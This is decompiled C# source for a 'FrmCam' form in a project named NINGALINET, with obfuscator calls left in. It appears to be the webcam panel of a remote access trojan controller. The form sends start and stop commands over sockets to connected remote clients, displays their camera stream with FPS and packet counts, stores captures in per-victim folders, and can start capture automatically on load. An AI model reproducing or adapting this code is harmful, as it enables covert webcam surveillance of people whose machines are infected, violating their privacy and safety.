using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NINGALINET
{
	// Token: 0x0200000D RID: 13
	[DesignerGenerated]
	public partial class FrmCam : Form
	{
		// Token: 0x06000312 RID: 786 RVA: 0x00003186 File Offset: 0x00001386
		[DebuggerNonUserCode]
		static FrmCam()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmCam.__ENCList = new List<WeakReference>();
		}

		// Token: 0x06000313 RID: 787 RVA: 0x0001F498 File Offset: 0x0001D698
		public FrmCam()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.FormClosing += new FormClosingEventHandler(this.Cam_FormClosing);
			base.Load += new EventHandler(this.Cam_Load);
			FrmCam.__ENCAddToList(this);
			this.int_0 = 0;
			this.pkt = 0;
			this.fps = 0;
			this.K = 0;
			this.InitializeComponent();
		}

		// Token: 0x06000314 RID: 788 RVA: 0x0001F504 File Offset: 0x0001D704
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmCam.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmCam.__ENCList.Count == FrmCam.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmCam.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmCam.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmCam.__ENCList[num] = FrmCam.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmCam.__ENCList.RemoveRange(num, FrmCam.__ENCList.Count - num);
						FrmCam.__ENCList.Capacity = FrmCam.__ENCList.Count;
					}
					FrmCam.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x1700013E RID: 318
		// (get) Token: 0x06000317 RID: 791 RVA: 0x0001FE6C File Offset: 0x0001E06C
		// (set) Token: 0x06000318 RID: 792 RVA: 0x0001FE84 File Offset: 0x0001E084
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				if (this._Timer1 != null)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				if (this._Timer1 != null)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x1700013F RID: 319
		// (get) Token: 0x06000319 RID: 793 RVA: 0x0001FEDC File Offset: 0x0001E0DC
		// (set) Token: 0x0600031A RID: 794 RVA: 0x00003197 File Offset: 0x00001397
		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox2 = value;
			}
		}

		// Token: 0x17000140 RID: 320
		// (get) Token: 0x0600031B RID: 795 RVA: 0x0001FEF4 File Offset: 0x0001E0F4
		// (set) Token: 0x0600031C RID: 796 RVA: 0x000031A0 File Offset: 0x000013A0
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x17000141 RID: 321
		// (get) Token: 0x0600031D RID: 797 RVA: 0x0001FF0C File Offset: 0x0001E10C
		// (set) Token: 0x0600031E RID: 798 RVA: 0x0001FF24 File Offset: 0x0001E124
		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox3_CheckedChanged);
				if (this._CheckBox3 != null)
				{
					this._CheckBox3.CheckedChanged -= value2;
				}
				this._CheckBox3 = value;
				if (this._CheckBox3 != null)
				{
					this._CheckBox3.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x17000142 RID: 322
		// (get) Token: 0x0600031F RID: 799 RVA: 0x0001FF7C File Offset: 0x0001E17C
		// (set) Token: 0x06000320 RID: 800 RVA: 0x0001FF94 File Offset: 0x0001E194
		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				if (this._Timer2 != null)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				if (this._Timer2 != null)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		// Token: 0x17000143 RID: 323
		// (get) Token: 0x06000321 RID: 801 RVA: 0x0001FFEC File Offset: 0x0001E1EC
		// (set) Token: 0x06000322 RID: 802 RVA: 0x000031A9 File Offset: 0x000013A9
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000144 RID: 324
		// (get) Token: 0x06000323 RID: 803 RVA: 0x00020004 File Offset: 0x0001E204
		// (set) Token: 0x06000324 RID: 804 RVA: 0x000031B2 File Offset: 0x000013B2
		internal virtual Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer3 = value;
			}
		}

		// Token: 0x17000145 RID: 325
		// (get) Token: 0x06000325 RID: 805 RVA: 0x0002001C File Offset: 0x0001E21C
		// (set) Token: 0x06000326 RID: 806 RVA: 0x000031BB File Offset: 0x000013BB
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x17000146 RID: 326
		// (get) Token: 0x06000327 RID: 807 RVA: 0x00020034 File Offset: 0x0001E234
		// (set) Token: 0x06000328 RID: 808 RVA: 0x0002004C File Offset: 0x0001E24C
		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox1_CheckedChanged);
				if (this._CheckBox1 != null)
				{
					this._CheckBox1.CheckedChanged -= value2;
				}
				this._CheckBox1 = value;
				if (this._CheckBox1 != null)
				{
					this._CheckBox1.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x17000147 RID: 327
		// (get) Token: 0x06000329 RID: 809 RVA: 0x000200A4 File Offset: 0x0001E2A4
		// (set) Token: 0x0600032A RID: 810 RVA: 0x000200BC File Offset: 0x0001E2BC
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.PictureBox1_Paint);
				if (this._PictureBox1 != null)
				{
					this._PictureBox1.Paint -= value2;
				}
				this._PictureBox1 = value;
				if (this._PictureBox1 != null)
				{
					this._PictureBox1.Paint += value2;
				}
			}
		}

		// Token: 0x17000148 RID: 328
		// (get) Token: 0x0600032B RID: 811 RVA: 0x00020114 File Offset: 0x0001E314
		// (set) Token: 0x0600032C RID: 812 RVA: 0x0002012C File Offset: 0x0001E32C
		internal virtual GroupDropBox GroupDropBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GroupDropBox1_Click);
				if (this._GroupDropBox1 != null)
				{
					this._GroupDropBox1.Click -= value2;
				}
				this._GroupDropBox1 = value;
				if (this._GroupDropBox1 != null)
				{
					this._GroupDropBox1.Click += value2;
				}
			}
		}

		// Token: 0x17000149 RID: 329
		// (get) Token: 0x0600032D RID: 813 RVA: 0x00020184 File Offset: 0x0001E384
		// (set) Token: 0x0600032E RID: 814 RVA: 0x0002019C File Offset: 0x0001E39C
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700014A RID: 330
		// (get) Token: 0x0600032F RID: 815 RVA: 0x000201F4 File Offset: 0x0001E3F4
		// (set) Token: 0x06000330 RID: 816 RVA: 0x000031C4 File Offset: 0x000013C4
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x06000331 RID: 817 RVA: 0x0002020C File Offset: 0x0001E40C
		private void Cam_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (File.Exists(Application.StartupPath + "\\Bin\\Webcam.ini"))
			{
				File.Delete(Application.StartupPath + "\\Bin\\Webcam.ini");
			}
			this.SS(Conversions.ToString(this.ComboBox2.SelectedIndex));
			this.SS(Conversions.ToString(this.CheckBox1.Checked));
			File.WriteAllText(Application.StartupPath + "\\Bin\\Webcam.ini", Conversions.ToString(this.sev));
			try
			{
				if (this.sk.CN)
				{
					this.sk.Send("@");
				}
				this.sk.CN = false;
			}
			catch (Exception expr_A3)
			{
				ProjectData.SetProjectError(expr_A3);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000332 RID: 818 RVA: 0x000202DC File Offset: 0x0001E4DC
		public object U()
		{
			string[] array = Strings.Split(File.ReadAllText(Application.StartupPath + "\\Bin\\Webcam.ini"), "\r\n", -1, CompareMethod.Binary);
			object result;
			if (Operators.CompareString(array[Conversions.ToInteger(this.K)].ToString(), "False", false) == 0)
			{
				result = false;
			}
			else if (Operators.CompareString(array[Conversions.ToInteger(this.K)].ToString(), "True", false) == 0)
			{
				result = true;
			}
			else
			{
				result = array[Conversions.ToInteger(this.K)].ToString();
			}
			this.K = Operators.AddObject(this.K, 1);
			return result;
		}

		// Token: 0x06000333 RID: 819 RVA: 0x00020390 File Offset: 0x0001E590
		public string SS(string f)
		{
			this.sev = Operators.AddObject(this.sev, f + "\r\n");
			return Conversions.ToString(this.sev);
		}

		// Token: 0x06000334 RID: 820 RVA: 0x000203C8 File Offset: 0x0001E5C8
		private void Cam_Load(object sender, EventArgs e)
		{
			this.point_2 = new Point(30, 30);
			try
			{
				this.ComboBox2.SelectedIndex = Conversions.ToInteger(this.U());
				this.CheckBox1.Checked = Conversions.ToBoolean(this.U());
			}
			catch (Exception expr_3D)
			{
				ProjectData.SetProjectError(expr_3D);
				ProjectData.ClearProjectError();
			}
			try
			{
				this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(ima.vno(this.osk.L)));
				this.Text = "Webcam - " + this.QQ;
				this.ComboBox2.SelectedIndex = 3;
				this.Timer1.Enabled = true;
				this.folder = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.osk.Folder, ima.vno(this.osk.L)), "\\Webcam\\"));
				if (!Directory.Exists(this.folder))
				{
					Directory.CreateDirectory(this.folder);
				}
				if (ima.F.SAUT1.Checked)
				{
					this.ComboBox1.Enabled = false;
					this.ComboBox2.Enabled = false;
					this.GroupDropBox1.Checked = false;
					this.Button1.Text = "Stop";
					this.sk.Send(string.Concat(new string[]
					{
						"!",
						ima.Y,
						Conversions.ToString(this.ComboBox1.SelectedIndex),
						ima.Y,
						this.ComboBox2.Text
					}));
				}
			}
			catch (Exception expr_187)
			{
				ProjectData.SetProjectError(expr_187);
				Exception projectError = expr_187;
				ProjectData.SetProjectError(projectError);
				this.Close();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000335 RID: 821 RVA: 0x000205B0 File Offset: 0x0001E7B0
		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			if (this.CheckBox3.Checked)
			{
				try
				{
					Process.Start(this.folder);
				}
				catch (Exception expr_1C)
				{
					ProjectData.SetProjectError(expr_1C);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x06000336 RID: 822 RVA: 0x000205F8 File Offset: 0x0001E7F8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (this.osk == null | this.sk == null)
				{
					this.Close();
				}
				else if (!this.osk.CN | !this.sk.CN)
				{
					this.Close();
				}
			}
			catch (Exception expr_45)
			{
				ProjectData.SetProjectError(expr_45);
				Exception projectError = expr_45;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000337 RID: 823 RVA: 0x000031CD File Offset: 0x000013CD
		private void Timer2_Tick(object sender, EventArgs e)
		{
			this.int_0 = this.fps;
			if (this.int_0 == 0)
			{
				this.pkt = 0;
				this.PictureBox1.Invalidate();
			}
			this.fps = 0;
		}

		// Token: 0x06000338 RID: 824 RVA: 0x00020674 File Offset: 0x0001E874
		private void PictureBox1_Paint(object sender, PaintEventArgs e)
		{
			string text = Conversions.ToString(this.int_0) + " FPS\r\n" + Fungsi.Siz((long)this.pkt);
			Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
			if (!(this.point_2.X < size.Width & this.point_2.Y < size.Height))
			{
				Rectangle rect = new Rectangle(0, 0, size.Width, size.Height);
				e.Graphics.FillRectangle(new Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect);
				Brush brush = Brushes.Red;
				try
				{
					if (this.int_0 > 3)
					{
						brush = Brushes.YellowGreen;
					}
					if (this.int_0 > 6)
					{
						brush = Brushes.LimeGreen;
					}
				}
				catch (Exception expr_C7)
				{
					ProjectData.SetProjectError(expr_C7);
					ProjectData.ClearProjectError();
				}
				e.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush, 0f, 0f);
			}
		}

		// Token: 0x06000339 RID: 825 RVA: 0x0002078C File Offset: 0x0001E98C
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (Operators.CompareString(this.Button1.Text, "Start", false) == 0)
				{
					this.Button1.Text = "Stop";
					this.ComboBox1.Enabled = false;
					this.ComboBox2.Enabled = false;
					this.GroupDropBox1.Checked = false;
					this.sk.Send(string.Concat(new string[]
					{
						"!",
						ima.Y,
						Conversions.ToString(this.ComboBox1.SelectedIndex),
						ima.Y,
						this.ComboBox2.Text
					}));
				}
				else
				{
					this.ComboBox1.Enabled = true;
					this.ComboBox2.Enabled = true;
					this.Button1.Text = "Start";
					this.sk.Send("@");
				}
			}
			catch (Exception expr_E2)
			{
				ProjectData.SetProjectError(expr_E2);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600033A RID: 826 RVA: 0x000031FF File Offset: 0x000013FF
		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.CheckBox1.Checked)
			{
				this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			}
			else
			{
				this.PictureBox1.SizeMode = PictureBoxSizeMode.Normal;
			}
		}

		// Token: 0x0600033B RID: 827 RVA: 0x00002F54 File Offset: 0x00001154
		private void GroupDropBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0400016B RID: 363
		private static List<WeakReference> __ENCList;

		// Token: 0x0400016D RID: 365
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x0400016E RID: 366
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		// Token: 0x0400016F RID: 367
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000170 RID: 368
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		// Token: 0x04000171 RID: 369
		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		// Token: 0x04000172 RID: 370
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000173 RID: 371
		[AccessedThroughProperty("Timer3")]
		private Timer _Timer3;

		// Token: 0x04000174 RID: 372
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x04000175 RID: 373
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		// Token: 0x04000176 RID: 374
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x04000177 RID: 375
		[AccessedThroughProperty("GroupDropBox1")]
		private GroupDropBox _GroupDropBox1;

		// Token: 0x04000178 RID: 376
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000179 RID: 377
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x0400017A RID: 378
		public string folder;

		// Token: 0x0400017B RID: 379
		public Client osk;

		// Token: 0x0400017C RID: 380
		public string QQ;

		// Token: 0x0400017D RID: 381
		public Client sk;

		// Token: 0x0400017E RID: 382
		public int int_0;

		// Token: 0x0400017F RID: 383
		public int pkt;

		// Token: 0x04000180 RID: 384
		public int fps;

		// Token: 0x04000181 RID: 385
		public object K;

		// Token: 0x04000182 RID: 386
		private object sev;

		// Token: 0x04000183 RID: 387
		private Point point_2;
	}
}
